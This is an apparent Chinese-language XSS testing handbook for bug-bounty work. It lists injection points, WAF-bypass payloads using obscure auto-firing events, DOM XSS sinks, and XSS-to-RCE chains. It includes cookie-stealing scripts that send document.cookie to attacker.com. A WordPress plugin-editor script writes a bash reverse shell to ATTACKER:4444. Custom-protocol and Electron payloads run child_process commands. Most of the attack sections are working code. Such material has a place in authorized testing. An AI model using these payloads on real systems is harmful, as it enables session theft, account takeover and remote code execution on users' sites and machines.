> 短表「XSS → RCE」「自定义协议 → RCE」用标题搜。英文附件 / polyglot 百科已砍；冷门事件和特权上下文仍留。
> **下面这些 payload 只是加速，不是清单。** 现场按上下文自己选、自己变；表上没有的编码/事件/标签照样打。禁止只轮询本节收过的那几条。

## 一、原有knowledge-base

# XSS 测试手册

## XSS 类型判断

| 类型 | 特征 |
|------|------|
| 存储型 | payload 存入数据库，他人访问触发 |
| 反射型 | payload 在 URL 参数中，需诱导点击 |
| DOM 型 | 纯前端处理，不经过服务端 |

打穿了按 `vuln-report-format` 定级，不按存储/反射/DOM 抬级。

---

## 常见注入点

```
搜索框 → 搜索结果页面
评论/留言区
个人records（昵称、签名、简介）
文件名（上传后展示）
404/错误页面（显示 URL 参数）
消息通知内容
客服聊天
富文本编辑器
Git / 文档站的 README、Wiki、议题、MR 描述（网页和桌面客户端都测，见 §8 XSS→RCE）
桌面客户端自定义协议（scheme 参数带 url / open / openUrl / webview，见 §8 自定义协议→RCE）
回跳参数 backUrl / returnUrl / redirect / next（javascript: 或 javascript%3A + document.write(document.cookie)）
富文本 / BBCode / wiki（`[p]` `[[p]]` `[div]` 转 HTML 时属性跟上；页面有 Layui/animate.css 就挂现成动画 class + onanimationstart）
```

---

## 基础 Payload

```html
<!-- 基础验证 -->
<script>alert(1)</script>
<script>alert(document.domain)</script>

<!-- 无 script 标签 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<details open ontoggle=alert(1)>

<!-- 属性注入（闭合属性）-->
" onmouseover="alert(1)
' onmouseover='alert(1)
"><img src=x onerror=alert(1)>
```

---

## WAF 绕过 Payload

```html
<!-- 大小写 -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=X ONERROR=alert(1)>

<!-- 事件多样化 -->
<body onpageshow=alert(1)>
<input autofocus onfocus=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- 冷门自动事件：onerror/onload 被剥时用。未知标签也能挂。内联作用域里 cookie 就是 document.cookie -->
<c2xh oncontentvisibilityautostatechange=a=alert,a(cookie) style=display:block;content-visibility:auto>
<!-- 未知标签被剥时换 input；只要 content-visibility:auto，不必 display:block -->
<input style=content-visibility:auto oncontentvisibilityautostatechange="alert(1)">
<!-- Popover：style 被剥时换这条。要点一下按钮。内联 URL 就是 document.URL -->
<button popovertarget=x>Click me</button><c2xl onbeforetoggle=a=alert,a(URL) popover id=x>Go</c2xl>

<!-- 编码 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<a href="javascript:\u0061lert(1)">click</a>

<!-- 注释分割 -->
<scr<!--注释-->ipt>alert(1)</scr<!--注释-->ipt>

<!-- 使用反引号 -->
<img src=`x` onerror=alert(1)>
```

---

## Cookie 窃取 Payload

```html
<!-- 发送 Cookie 到攻击者服务器 -->
<script>
new Image().src="https://attacker.com/steal?c="+encodeURIComponent(document.cookie)
</script>

<!-- fetch 版本（更可靠） -->
<script>
fetch("https://attacker.com/steal",{method:"POST",body:document.cookie})
</script>

<!-- SRC 验证（无需真实接收，用 dnslog 即可）-->
<script>
document.write('<img src="http://'+document.cookie.split(';')[0].split('=')[1]+'.your-dnslog.cn">')
</script>
```

---

## DOM XSS 查找

```javascript
// 搜索危险接收点
search_in_sources("innerHTML")
search_in_sources("document.write")
search_in_sources("eval(")
search_in_sources("location.hash")
search_in_sources("location.search")

// 常见 DOM XSS 源
document.location.hash    // #后面的内容
document.location.search  // ?后面的参数
document.referrer
window.name
postMessage
```

---

## XSS 证明方式（SRC 要求）

对于 SRC 提交，**禁止使用 alert(1)** 证明危害，应使用：

```javascript
// 证明能读取 Cookie
alert(document.cookie)
// 内联事件里可写成 a=alert,a(cookie) 或 a=alert,a(URL)（作用域就是 document.cookie / document.URL）

// 证明能读取 token（localStorage）
alert(localStorage.getItem('token') || sessionStorage.getItem('token'))

// 证明 domain（证明不是 self-xss）
alert(document.domain)
```

---

### 冷门事件 + 内联作用域（onerror/onload 被拦时）

标签名随意（`c2xh` / `c2xl` 这种未知元素也能挂）。内联事件的作用域摸得到 `document`：`cookie` = `document.cookie`，`URL` = `document.URL`。拦 `document` / `alert(1)` 时用 `a=alert,a(cookie)` 或 `a=alert,a(URL)`。

不用点（`style` 还在时）：

```html
<c2xh oncontentvisibilityautostatechange=a=alert,a(cookie) style=display:block;content-visibility:auto>
<input style=content-visibility:auto oncontentvisibilityautostatechange="alert(1)">
```

未知标签被剥就换 `input` / `p`（或其它白名单标签）。`input` 上往往只要 `content-visibility:auto`，不必再写 `display:block`。`alert(1)` 能过就先过；拦了再换 `a=alert,a(cookie)`。

富文本 / BBCode / wiki 若把 `[p]`、`[[p]]`、`[div]` 转成对应 HTML 且属性原样带过去，直接挂在允许的标签上：

```
[[p oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto][/p]]
[div onmousemove=eval.call`${'al\x65rt(1)'}` style=position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999][/div]
```

`onmousemove` 要点/滑鼠标；`position:fixed` 铺满是为了鼠标一动就中。`eval.call\`...\`` 是标签模板调 `eval`；`\x65` 是 `e`，躲开字面 `alert`。自动事件能过就别用这条。

`onerror`/`onload` 被剥、自动事件也不走时，换指针事件 + 把元素撑大，鼠标一进就中（URL 编码常见）：

```
<svg%20id%3dmySvg%20onpointerenter%3da=alert,a(cookie)%20width%3d10000%20height%3d10000></svg>%2F%2F
```

解码即 `<svg id=mySvg onpointerenter=a=alert,a(cookie) width=10000 height=10000></svg>//`。末尾 `//` 注释掉注入点后面的残留。假点：没划进这张超大 svg；标签/事件被剥。

页面已经引入 Layui / animate.css 这类现成动画时，挂库里的 class，用 `onanimationstart` 自动开火，不用自己写 `@keyframes`：

```
[div class=layui-anim-up onanimationstart=javascript:alert(1)][/div]
```

事件处理里写 `javascript:alert(1)` 时，`javascript:` 是 JS 标签（label），后面的 `alert(1)` 照样跑，不是 URL 协议。假点：页面没有这段 CSS；class / 事件被剥；动画没播。

假点：只换标签名、属性被剥；转出来是纯文本；没滑鼠标；`style` 被剥只剩小块要精确悬停；CSP 禁 `eval`。前面的「Life：face」这类只是正文，不是 payload 的一部分。

`style` / `content-visibility` 被剥时换 Popover，要点一下按钮。`popovertarget` 对上 `id`，`onbeforetoggle` 在弹出前开火：

```html
<button popovertarget=x>Click me</button><c2xl onbeforetoggle=a=alert,a(URL) popover id=x>Go</c2xl>
```

Chrome / Edge 优先。Firefox、Safari 这两个 API 经常不响，换别的事件，这条不算死。Popover 那条没点按钮不算打穿。

## 8. XSS → RCE / 自定义协议（短表有指针）

### XSS → RCE（特权上下文，和上面偷 Cookie 是同一条链的升级）

存储/反射 XSS 打穿之后，或 Electron 自己把外站页拉进特权窗之后，问的是：**这段 JS 跑在谁的进程里**。网页里只是会话；落到能写插件、能调本机桥的地方才是 RCE。下面几条是同一类，不是互斥。

**网页后台（WordPress 等）**：管理员会话 + 能改插件/主题的编辑器。Hello Dolly 只是现成文件，别的可写入口一样打。

```javascript
p = '/wp-admin/plugin-editor.php?';
q = 'file=hello.php';
s = '<?=`bash -i >& /dev/tcp/ATTACKER/4444 0>&1`;?>';
a = new XMLHttpRequest();
a.open('GET', p+q, 0); a.send();
$ = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
    '&newcontent=' + encodeURIComponent(s) + '&action=update&' + q;
b = new XMLHttpRequest();
b.open('POST', p+q, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send($);
b.onreadystatechange = function(){ if(this.readyState==4) fetch('/wp-content/plugins/hello.php'); }
```

**桌面客户端（CEF / Electron / 企业 Git GUI）**：有 node 桥 / `nodeIntegration` / `enableRemoteModule` / 暴露的 `Buffer`·`require`·`child_process`，页面里的 JS 就在本机进程里跑。payload 按现场选（自动跳转、外链、事件、远程页），**不要死抄某一种 gadget**。沙箱死了 → 当普通存储 XSS 继续打网页，不宣布这条死。

投递 1（存储 XSS）：README、议题、评论里存的 HTML，客户端当网页渲。组员/邀请接口若只认数字 `user_id`，递增拉人即可（就是 `idor-test.md` 里已有的顺序 ID + 批量写）。对方克隆列表若不隔离，你的仓会出现在他客户端里，打开 README 即触发。拉人本身不是洞的主体，主体仍是客户端把 HTML 渲成了特权 XSS。

### 自定义协议 → RCE（短表有指针）

投递 2（自定义协议，不必先有存储 XSS）：客户端注册了自己的 scheme。macOS 看 `Info.plist` 的 `CFBundleURLSchemes`，Windows 看安装时写的协议，包里的 JS 搜 `setAsDefaultProtocolClient` / `open-url` / `second-instance`。协议参数里出现 `url`、`urlType`、`open`、`openUrl`、`webview`，就试把外站地址塞进去。两种常见形态（字段名跟现场走，不要死抄）：

- JSON：`scheme://app/open?params={"url":"http://attacker","urlType":1}`
- 扁平：`scheme://openUrl?url=http://attacker/exp.html`

浏览器地址栏或任意 `href` 打开，系统会问「要打开该应用吗」——对方点一次就算合理交互，不需要中间人。

攻击页先探桥，再弹计算器。不要因为 Electron 18+ 或没有 `remote` 就停。顺序：`typeof process` → `typeof require`（`require.toString()` 含 `native` 才当真）→ `window.require` → 没有再看预加载桥 / `window.electron.ipcRenderer`。`require` 能直接 `child_process` 就用它；只有老窗口才走：

```
const {remote} = require('electron');
remote.require('child_process').exec('open -a Calculator');
```

Windows 把命令换成 `calc`。预加载只露了 `ipcRenderer`、调不了命令 → 这条桥没打穿，别写成 RCE。

算成：本机弹出计算器 / 执行了你指定的无害命令。只在浏览器 alert、客户端不渲、只弹「打开应用」但不加载外站、或跳了但没执行 → 停在调起/存储 XSS，别写成 RCE。协议只开自家域、`require` 和 `remote` 都没有 → 这条投递到此为止，改打投递 1 或网页面。
